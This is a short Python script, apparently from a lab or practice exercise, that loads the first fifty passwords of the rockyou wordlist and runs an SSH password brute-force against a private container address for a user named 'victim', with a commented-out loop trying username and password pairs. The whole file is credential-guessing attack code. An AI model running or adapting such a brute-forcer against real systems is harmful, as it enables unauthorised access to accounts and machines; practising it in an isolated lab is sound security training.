#!/usr/bin/env python3
import bruteforcer as bf

with open('/opt/rockyou_utf8.txt') as rock:
    lista = []
    for i in range(50):
        lista.append(rock.readline().rstrip("\n"))
# print(lista)
lista.append("mine17")
# print(lista)
server = '172.17.0.2'
username = 'victim'
password = 'mine17'

username_list = ['victim', 'root']
password_list = ['mine17', 'password']
'''
for user in username_list:
    for passw in password_list:
        out = ssh(server, user, passw, 'id', 22, True)
'''

# Brute forcer
bf.ssh_brute_pass(server, username, lista)
